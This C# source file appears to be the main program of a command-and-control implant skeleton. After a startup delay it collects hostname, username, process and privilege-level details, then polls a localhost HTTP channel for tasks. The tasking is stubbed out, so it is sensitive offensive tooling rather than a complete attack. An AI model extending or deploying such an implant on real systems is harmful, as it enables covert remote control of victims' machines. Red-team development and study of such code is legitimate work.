using AgentClient.Infrastructure.CommModules;
using AgentClient.Domain.Models.Agents;
using System.Diagnostics;
using System.Security.Principal;
using System;

namespace AgentClient
{
    public class Program
    {
        private static Agent _agent;
        private static AgentMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource;

        static void Main(string[] args)
        {
            Thread.Sleep(15000);

            GenerateMetadata();

            _agent = new Agent(_metadata);

            _commModule = new HttpCommModule("http://localhost", 8080, _agent);
            _commModule.Initialiser(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.ReceiveData(out var tasks))
                {
                    // action
                }
            }
        }

        public Task Stop()
        {
            return Task.FromCanceled(_tokenSource.Token);
        }

        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);

            var integrity = "Medium";

            if (identity.IsSystem)
            {
                integrity = "SYSTEM";
            }

            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                integrity = "High";
            }


            _metadata = new AgentMetadata
            {
                Hostname = Environment.MachineName,
                Username = identity.Name,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Integrity = integrity,
                Architecture = IntPtr.Size == 8 ? "x64" : "x32"
            };

            process.Dispose();
            identity.Dispose();

        }
    }
}
